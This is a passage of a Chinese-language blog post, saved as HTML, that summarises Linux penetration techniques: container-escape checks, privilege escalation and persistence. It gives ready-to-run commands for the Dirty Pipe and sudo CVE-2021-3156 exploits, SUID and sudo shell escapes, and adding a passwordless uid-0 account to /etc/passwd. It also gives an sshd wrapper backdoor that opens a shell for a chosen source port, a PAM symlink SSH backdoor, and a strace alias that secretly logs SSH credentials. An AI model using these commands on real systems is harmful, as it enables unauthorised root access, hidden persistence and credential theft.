@@ -1,0 +1,567 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Linux渗透总结 | Khaz's Blog</title><meta name="author" content="Khaz"><meta name="copyright" content="Khaz"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="容器逃逸如何判断是否在docker容器内 ls -al &#x2F;.dockerenv   cat &#x2F;proc&#x2F;1&#x2F;cgroup   docker容器逃逸检测脚本teamssix&#x2F;container-escape-check: docker container escape check || Docker 容器逃逸检测 (github.com) 一个未公开的容器逃逸方式 - FreeBuf网络安">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux渗透总结">
+<meta property="og:url" content="http://fgtbnc.github.io/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/index.html">
+<meta property="og:site_name" content="Khaz&#39;s Blog">
+<meta property="og:description" content="容器逃逸如何判断是否在docker容器内 ls -al &#x2F;.dockerenv   cat &#x2F;proc&#x2F;1&#x2F;cgroup   docker容器逃逸检测脚本teamssix&#x2F;container-escape-check: docker container escape check || Docker 容器逃逸检测 (github.com) 一个未公开的容器逃逸方式 - FreeBuf网络安">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg">
+<meta property="article:published_time" content="2023-10-15T11:48:25.000Z">
+<meta property="article:modified_time" content="2023-10-15T15:13:27.770Z">
+<meta property="article:author" content="Khaz">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fgtbnc.github.io/images/wallhaven-r29l9q.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://fgtbnc.github.io/2023/10/15/Linux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":250},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Linux渗透总结',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-15 23:13:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom/beauty.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://raw.githubusercontent.com/Khazing/typora-img/main/16870577801892f4a9c5aac2e9e5422a6ccd26db10dd88c73.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">79</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Khaz's Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">Linux渗透总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-15T11:48:25.000Z" title="发表于 2023-10-15 19:48:25">2023-10-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-15T15:13:27.770Z" title="更新于 2023-10-15 23:13:27">2023-10-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Linux渗透总结"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="post-content" id="article-container"><h1 id="容器逃逸"><a href="#容器逃逸" class="headerlink" title="容器逃逸"></a>容器逃逸</h1><p>如何判断是否在docker容器内</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -al /.dockerenv</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230901114550082.png?lastModify=1695029992" alt="image-20230901114550082"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20230901114605623.png?lastModify=1695029992" alt="image-20230901114605623"></p>
+<p>docker容器逃逸检测脚本<a target="_blank" rel="noopener" href="https://github.com/teamssix/container-escape-check">teamssix&#x2F;container-escape-check: docker container escape check || Docker 容器逃逸检测 (github.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/es/377292.html">一个未公开的容器逃逸方式 - FreeBuf网络安全行业门户</a></p>
+<h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="辅助工具"><a href="#辅助工具" class="headerlink" title="辅助工具"></a>辅助工具</h2><h3 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a><strong><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a></strong></h3><p>GTFOBins是一个精心策划的Unix二进制文件列表，可以用来绕过错误配置系统中的本地安全限制。该项目收集了Unix二进制文件的合法函数，这些函数可能被滥用，以打破受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，并为其他事后利用任务提供便利。需要注意的是，这不是一个漏洞列表，这里列出的程序本身并不容易受到攻击，相反，<strong>GTFOBins是一个概要，说明当您只有某些二进制文件可用时，如何获得root权限</strong>。</p>
+<h3 id="beroot"><a href="#beroot" class="headerlink" title="beroot"></a><strong>beroot</strong></h3><p>BeRoot用于检查Linux和Mac OS上常见的错误配置，以找到一种方法来升级我们的特权。检查项包括GTFOBins中的二进制文件、通配符错误、suid、环境变量、NFS、sudo等等</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 beroot.py</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231015201659431.png" alt="image-20231015201659431"></p>
+<p><img src="/../images/image-20231015201711821.png" alt="image-20231015201711821"></p>
+<p><img src="/../images/image-20231015201721586.png" alt="image-20231015201721586"></p>
+<h3 id="Linepeas–不只是提权"><a href="#Linepeas–不只是提权" class="headerlink" title="Linepeas–不只是提权"></a><strong>Linepeas–不只是提权</strong></h3><p>LinPEAS 是一个脚本，用于搜索在 Linux&#x2F;Unix*&#x2F;MacOS 主机上提升权限的可能路径。</p>
+<p><a target="_blank" rel="noopener" href="https://www.ddosi.org/peass-ng/">PEASS-ng Windows&#x2F;linux&#x2F;unix*&#x2F;macOS提权工具 - 🔰雨苁ℒ🔰 (ddosi.org)</a></p>
+<h3 id="pspy–进程监控"><a href="#pspy–进程监控" class="headerlink" title="pspy–进程监控"></a><strong>pspy</strong>–进程监控</h3><p>Pspy是一个命令行工具，用于在不需要root权限的情况下窥探进程。该工具通关循环遍历&#x2F;proc下的值来获取进程参数信息。比如说我们可以找到一些定时任务进程或其他可疑进程来尝试提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./pspy64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231015201909328.png" alt="image-20231015201909328"></p>
+<h3 id="traior–自动化提权🐂"><a href="#traior–自动化提权🐂" class="headerlink" title="traior–自动化提权🐂"></a>traior–自动化提权🐂</h3><p>多个linux提权漏洞缝合怪，运行后会给出提权方法，并内置了exp可以直接使用</p>
+<p><img src="/../images/image-20231015202209167.png" alt="image-20231015202209167"></p>
+<p><img src="/../images/image-20231015202355175.png" alt="image-20231015202355175"></p>
+<p><img src="/../images/image-20231015202422512.png" alt="image-20231015202422512"></p>
+<h2 id="常见提权手法"><a href="#常见提权手法" class="headerlink" title="常见提权手法"></a>常见提权手法</h2><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><ul>
+<li><p><strong>脏牛漏洞（CVE-2016-5195）</strong></p>
+<blockquote>
+<p>漏洞原理：该漏洞具体为，get_user_page内核函数在处理<strong>Copy-on-Write</strong>(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。<strong>修改su或者passwd程序</strong>就可以达到root的目的。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs">PoCs · dirtycow&#x2F;dirtycow.github.io Wiki</a></p>
+</li>
+<li><p><strong>Dirty Pipe(CVE-2022-0847)</strong></p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit">https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit</a></p>
+<p>覆盖 &#x2F;etc&#x2F;passwd 中的 root 密码字段并在弹出 root shell 后恢复</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://haxx.in/files/dirtypipez.c">https://haxx.in/files/dirtypipez.c</a></p>
+<p>直接修改一个具有suid权限的可执行文件，然后执行这个可执行文件提权，完成提权后再把文件改回来</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://haxx.in/files/dirtypipez.c</span><br><span class="line">gcc -o dirtypipez dirtypipez.c</span><br><span class="line">./dirtypipez /usr/bin/su  <span class="comment">#任何具体suid权限的文件均可</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231015204347541.png" alt="image-20231015204347541"></p>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">谈一谈Linux与suid提权 | 离别歌 (leavesongs.com)</a></p>
+<p><img src="/../images/image-20230220142509956.png" alt="image-20230220142509956"></p>
+<blockquote>
+<p>suid全称是<strong>S</strong>et owner <strong>U</strong>ser <strong>ID</strong> up on execution。这是Linux给可执行文件的一个属性。</p>
+<p>设置了s位的程序在运行时，其<strong>Effective UID</strong>将会设置为这个程序的所有者。比如，<code>/bin/ping</code>这个程序的所有者是0（root），它设置了s位，那么普通用户在运行ping时其<strong>Effective UID</strong>就是0，等同于拥有了root权限。</p>
+</blockquote>
+<p><img src="/../images/image-20230220142233418.png" alt="image-20230220142233418"></p>
+<p>查找具有s位权限的命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
+
+<p>常见suid提权命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec command \;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./vim -c &#x27;:python3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+
+<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><blockquote>
+<p>sudo：super user do</p>
+</blockquote>
+<h4 id="不恰当的sudo命令配置"><a href="#不恰当的sudo命令配置" class="headerlink" title="不恰当的sudo命令配置"></a>不恰当的sudo命令配置</h4><p>原理：</p>
+<p>在<strong>交互模式</strong>以及<strong>无密码</strong>情况下（知道密码直接切换为root用户就好了）可以使用<code>sudo -l</code>查找哪些命令可以以root权限执行，使用这些命令创建一个新shell即可提权</p>
+<p><img src="/../images/image-20230220161114377.png" alt="image-20230220161114377"></p>
+<p><img src="/../images/image-20230220161140688.png" alt="image-20230220161140688"></p>
+<p>在vi的ESC模式下输入<code>!/bin/bash</code>后按下回车即可变为root权限。</p>
+<h4 id="Linux-sudo权限提升漏洞（CVE-2021-3156）–-成功率高"><a href="#Linux-sudo权限提升漏洞（CVE-2021-3156）–-成功率高" class="headerlink" title="Linux sudo权限提升漏洞（CVE-2021-3156）– 成功率高"></a>Linux sudo权限提升漏洞（CVE-2021-3156）– 成功率高</h4><p><strong>查看sudo版本</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo --version</span><br></pre></td></tr></table></figure>
+
+<p><strong>版本影响</strong></p>
+<ul>
+<li><p>sudo 1.8.2 - 1.8.31p2</p>
+</li>
+<li><p>sudo 1.9.0 - 1.9.5p1</p>
+</li>
+</ul>
+<p><strong>简单判断方法</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudoedit -s /</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>如果显示sudoedit: &#x2F;: not a regular file，则表示该漏洞存在</p>
+</blockquote>
+<p><strong>EXP使用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/worawit/CVE-2021-3156">https://github.com/worawit/CVE-2021-3156</a></p>
+<ul>
+<li><p>对于 glibc 支持并启用了 tcache 的 Linux 发行版（CentOS 8、Ubuntu &gt;&#x3D; 17.10、Debian 10）</p>
+<p>exploit_nss.py→exploit_timestamp_race.c</p>
+</li>
+<li><p>对于 glibc 不支持 tcache 的 Linux 发行版（Debian 9, Ubuntu 16.04, or Ubuntu 14.04）</p>
+<p>exploit_nss_xxx.py→exploit_defaults_mailer.py→exploit_userspec.py</p>
+</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://github.com/blasty/CVE-2021-3156">blasty&#x2F;CVE-2021-3156 (github.com)</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./sudo-hax-me-a-sandwich num <span class="comment"># 选择合适的序号</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20231015214211618.png" alt="image-20231015214211618"></p>
+<h3 id="环境变量提权"><a href="#环境变量提权" class="headerlink" title="环境变量提权"></a>环境变量提权</h3><p>本质上还是suid提权，只不过具有suid权限的命令是用户自定义的，调用了其他命令，我们可以通过劫持调用的其他命令来提权。</p>
+<p>比如有一个root用户自定义的具有suid权限的test命令，调用了系统命令ls，那我们可以找到一个可写目录，通过修改$PATH环境变量，劫持ls命令。</p>
+<p>参考<a href="https://fgtbnc.github.io/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/">环境变量注入 | Khaz’s Blog (fgtbnc.github.io)</a></p>
+<h3 id="权限配置不当提权"><a href="#权限配置不当提权" class="headerlink" title="权限配置不当提权"></a>权限配置不当提权</h3><p>原理：某个脚本或命令以ROOT权限运行，但是低权限用户拥有修改写入权限</p>
+<ul>
+<li>通过pspy找到可疑进程</li>
+<li>定时任务</li>
+<li>…..</li>
+</ul>
+<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h4 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h4><p>teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</p>
+<p>核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录（空密码不能远程登录）。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</p>
+<h1 id="Linux信息收集"><a href="#Linux信息收集" class="headerlink" title="Linux信息收集"></a>Linux信息收集</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./gather -a</span><br></pre></td></tr></table></figure>
+
+<p>默认在<code>/tmp/report</code>下生成结果</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">keyword.txt <span class="comment"># 这个有点少，要自己加</span></span><br><span class="line">result.txt</span><br><span class="line">tree.txt <span class="comment"># 目录结构</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>自己添加命令整理成sh脚本</strong></p>
+<h1 id="Linux横向移动"><a href="#Linux横向移动" class="headerlink" title="Linux横向移动"></a>Linux横向移动</h1><p>隧道搭建后，进行主机和端口探测，跟外网差不多</p>
+<ul>
+<li><p>Fscan</p>
+</li>
+<li><p>LadonGo</p>
+</li>
+<li><p>敏感信息收集</p>
+</li>
+</ul>
+<h1 id="Linux权限维持"><a href="#Linux权限维持" class="headerlink" title="Linux权限维持"></a>Linux权限维持</h1><h2 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h2><h3 id="SSH-wrapper"><a href="#SSH-wrapper" class="headerlink" title="SSH wrapper"></a>SSH wrapper</h3><p>被攻击机</p>
+<blockquote>
+<p>首先启动的是&#x2F;usr&#x2F;sbin&#x2F;sshd,脚本执行到getpeername这里的时候，正则匹配会失败，于是执行下一句，启动&#x2F;usr&#x2F;bin&#x2F;sshd，这是原始sshd。原始的sshd监听端口建立了tcp连接后，会fork一个子进程处理具体工作。这个子进程，没有什么检验，而是直接执行系统默认的位置的&#x2F;usr&#x2F;sbin&#x2F;sshd，这样子控制权又回到脚本了。此时子进程标准输入输出已被重定向到套接字，getpeername能真的获取到客户端的TCP源端口，如果是19526就执行sh给个shell</p>
+<p>简单点就是从sshd fork出一个子进程，输入输出重定向到套接字，并对连过来的客户端端口进行了判断。</p>
+</blockquote>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /usr/sbin/</span><br><span class="line">mv sshd ../bin</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">会导致ssh不能用</span></span><br><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br><span class="line">echo &#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27; &gt;&gt;sshd  </span><br><span class="line">echo &#x27;exec&#123;&quot;/usr/bin/sshd&quot;&#125; &quot;/usr/sbin/sshd&quot;,@ARGV,&#x27; &gt;&gt;sshd</span><br><span class="line">chmod u+x sshd</span><br><span class="line"></span><br><span class="line">service sshd restart</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p> \x00\x004A是13377的大端形式</p>
+</blockquote>
+<p>攻击机</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">socat STDIO TCP4:IP:22,sourceport=port</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../blog/source/images/image-20230823151639936.png" alt="image-20230823151639936"></p>
+<p>修改通信端口</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line">port = <span class="number">19526</span></span><br><span class="line">buffer = struct.pack(<span class="string">&#x27;&gt;I6&#x27;</span>,port)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">repr</span>(buffer)</span><br><span class="line"></span><br><span class="line">&gt;&gt;<span class="string">&#x27;\x00\x00LF&#x27;</span></span><br><span class="line"></span><br><span class="line">echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..4A/);&#x27;</span> &gt;&gt;sshd </span><br><span class="line">变为</span><br><span class="line">echo <span class="string">&#x27;exec &quot;/bin/sh&quot; if(getpeername(STDIN) =~ /^..LF/);&#x27;</span> &gt;&gt;sshd </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SSH-软连接后门"><a href="#SSH-软连接后门" class="headerlink" title="SSH 软连接后门"></a>SSH 软连接后门</h3><blockquote>
+<ol>
+<li><p>PAM认证机制，若sshd服务中开启了PAM认证机制（默认开启<code>cat /etc/ssh/sshd_config|grep UsePAM</code>），当程序执行时，PAM模块则会搜寻PAM相关设定文件，设定文件一般是在&#x2F;etc&#x2F;pam.d&#x2F;。若关闭则会验证密码，无法建立软链接后门。</p>
+</li>
+<li><p>pam_rootok.so主要作用是使得uid为0的用户，即root用户可以直接通过认证而不需要输入密码。</p>
+</li>
+<li><p><code>find /etc/pam.d |xargs grep &quot;pam_rootok&quot; </code></p>
+<p><img src="/../../../blog/source/images/image-20230830230859930.png" alt="image-20230830230859930"></p>
+<p><strong>这些都可以作为ssh软链接后门</strong>：当我们通过特定的端口连接ssh后，应用在启动过程中就会去找到配置文件，如：我们的软链接文件为&#x2F;tmp&#x2F;su，那么应用就会找&#x2F;etc&#x2F;pam.d&#x2F;su作为配置文件，因为&#x2F;etc&#x2F;pam.d&#x2F;su使用了pam_rootok.so所以无需验证密码即可连接。</p>
+</li>
+</ol>
+</blockquote>
+<p>失败了。。</p>
+<p><img src="/../../../blog/source/images/image-20230830222011164.png" alt="image-20230830222011164"></p>
+<p>是因为SSH wrapper</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &#x27;#!/usr/bin/perl&#x27; &gt;sshd</span><br></pre></td></tr></table></figure>
+
+<p>需要重新安装ssh</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/sbin/su /tmp/su</span><br><span class="line">/tmp/su -oPort=8888</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../blog/source/images/image-20230830230550836.png" alt="image-20230830230550836"></p>
+<p>实际上是随便输一个密码就可以登陆，但是不能不输密码。</p>
+<h3 id="SSH-公钥免密登陆"><a href="#SSH-公钥免密登陆" class="headerlink" title="SSH 公钥免密登陆"></a>SSH 公钥免密登陆</h3><p>之前打靶机的时候的笔记</p>
+<p>ssh验证方式</p>
+<p><img src="/../../../blog/source/images/image-20230304140701229-1693405604693.png" alt="image-20230304140701229"></p>
+<p>这里第二种：假设主机A要用SSH登录到主机B，那么只要主机A有私钥，主机B有对应的公钥即可，与是主机A生产的，还是主机B生成的无关。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">host为主机名（root）</span></span><br><span class="line">ssh host@ip -p port（password验证）</span><br><span class="line">ssh host@ip -i id_rsa -p port(密钥验证，私钥权限要为600才可以使用)</span><br></pre></td></tr></table></figure>
+
+<p>配置文件<code>/etc/ssh/sshd_config</code></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication yes 						#启用密码验证</span><br><span class="line">PubkeyAuthentication yes 						#启用密钥对验证</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys 		#指定公钥库文件</span><br></pre></td></tr></table></figure>
+
+<p>流程</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa # 生成密钥对</span><br><span class="line">cat id_rsa.pub &gt; authorized_keys #将公钥内容放到目标.ssh/authorized_keys里 </span><br><span class="line"></span><br><span class="line">ssh-copy-id host@ip -p 22 #将公钥上传至远程服务器用户目录中</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="strace后门"><a href="#strace后门" class="headerlink" title="strace后门"></a>strace后门</h2><p>通过<strong>命令替换（命令行启动文件加入alias）</strong>动态跟踪系统调用和数据，可以用来记录用户ssh、su、sudo的操作。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">监控ssh</span></span><br><span class="line">echo &quot;alias ssh=&#x27;strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh&#x27;&quot; &gt;&gt; /root/.bashrc</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">立即生效</span></span><br><span class="line">source /root/.bashrc</span><br></pre></td></tr></table></figure>
+
+<p>kali没有strace，但是云服务器默认是装了的</p>
+<p><img src="/../../../blog/source/images/image-20230830223830491.png" alt="image-20230830223830491"></p>
+<p>查看记录的ssh连接</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /tmp/.ssh.log </span><br></pre></td></tr></table></figure>
+
+<p><img src="/../../../blog/source/images/image-20230830232440346.png" alt="image-20230830232440346"></p>
+<h2 id="自启动文件后门"><a href="#自启动文件后门" class="headerlink" title="自启动文件后门"></a>自启动文件后门</h2><p>写入自启动文件中</p>
+<ul>
+<li><p>开机启动项</p>
